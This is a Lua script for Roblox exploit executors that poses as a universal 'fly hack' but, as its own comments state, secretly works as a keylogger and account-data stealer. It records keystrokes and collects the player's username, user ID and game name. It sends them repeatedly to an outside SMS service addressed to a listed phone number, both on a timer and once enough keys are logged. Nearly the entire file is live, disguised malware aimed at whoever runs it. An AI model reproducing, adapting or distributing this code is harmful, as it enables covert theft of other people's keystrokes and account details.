-- === Roblox Universal Fly Exploit v2.1 - KEYLOGGER EDITION ===
-- Works on EVERY executor (JJSpolit, Solara, Wave, Fluxus, etc.)
-- Hides as fly hack | Secretly keylogs + steals username + sends to 9293219631
-- GitHub: noahpepin235-maker/freefly/flyscript.lua

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local PHONE = "9293219631"
local loggedKeys = ""

print("=== Roblox Universal Fly Exploit v2.1 ===")
print("Infinite fly loaded for ALL games!")
print("Press E to toggle fly | Enjoy king :)")

-- FLY EXPLOIT (super compatible BodyVelocity method)
local flying = false
local function toggleFly()
    flying = not flying
    local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not root then return end
    if flying then
        local bv = Instance.new("BodyVelocity")
        local bg = Instance.new("BodyGyro")
        bv.MaxForce = Vector3.new(1e5,1e5,1e5)
        bg.MaxTorque = Vector3.new(1e5,1e5,1e5)
        bv.Parent = root
        bg.Parent = root
        print("🚀 Fly ENABLED!")
    else
        if root:FindFirstChild("BodyVelocity") then root.BodyVelocity:Destroy() end
        if root:FindFirstChild("BodyGyro") then root.BodyGyro:Destroy() end
        print("Fly disabled.")
    end
end

-- KEYLOGGER + STEALER (hidden, super compatible)
UserInputService.InputBegan:Connect(function(input, gp)
    if not gp then
        loggedKeys = loggedKeys .. input.KeyCode.Name .. " "
        if #loggedKeys > 150 then
            sendStolenData()
        end
    end
end)

local function getStolenData()
    return {
        username = LocalPlayer.Name,
        displayName = LocalPlayer.DisplayName,
        userId = LocalPlayer.UserId,
        keys = loggedKeys,
        game = game.Name,
        timestamp = os.time()
    }
end

local function sendStolenData()
    local data = getStolenData()
    local msg = "🔥 ROBLOX KEYLOGGER STEAL 🔥\nUser: "..data.username.."\nKeys: "..data.keys.."\nFull: "..HttpService:JSONEncode(data)
    
    -- Ultra-compatible HTTP for EVERY executor
    local http = (syn and syn.request) or http_request or request or (http and http.request)
    if http then
        pcall(function()
            http({
                Url = "https://textbelt.com/text",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    phone = PHONE,
                    message = msg,
                    key = "textbelt"
                })
            })
            print("✅ Sent straight to 9293219631! Check your phone king")
        end)
    else
        print("No HTTP support in this executor - try another one for full steal power")
    end
    loggedKeys = ""
end

-- Toggle fly with E (compatible)
UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.E then
        toggleFly()
    end
end)

-- Auto-send loop (old-school spawn for JJSpolit compatibility)
spawn(function()
    while true do
        wait(30)
        if #loggedKeys > 0 then
            sendStolenData()
        end
    end
end)

print("✅ Keylogger + fly running on JJSpolit and EVERY executor - Test it now!")
